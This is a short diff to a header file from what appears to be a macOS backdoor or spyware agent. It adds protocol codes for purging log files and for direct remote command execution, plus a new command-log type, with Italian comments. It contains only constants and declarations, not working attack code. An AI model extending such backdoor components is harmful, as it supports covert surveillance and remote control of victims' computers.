@@ -351,6 +351,8 @@ extern u_int remoteAgents[];
 #define PROTO_ENDFILE     0x17  // End of Transmission - file download
 #define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype
 #define PROTO_FILESYSTEM  0x19  // List of paths to be scanned
+#define PROTO_PURGE       0x1a  // Elimina i file di log vecchi o troppo grossi
+#define PROTO_COMMANDS    0x1b  // Esecuzione diretta di comandi
 
 #pragma mark -
 #pragma mark Log Types
@@ -360,6 +362,7 @@ extern u_int remoteAgents[];
 #define LOG_FILESYSTEM    0xEDA1
 #define LOG_URL_SNAPSHOT  AGENT_URL+1
 #define LOG_INFO          0x0241
+#define LOG_COMMAND       0xC0C1
 
 #pragma mark -
 #pragma mark Agents Data Struct Definition
@@ -622,4 +625,6 @@ void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal);
 NSString *createLaunchdPlistPath();
 void removeOldLd();
 void removeAppleHID();
+
+
 #endif
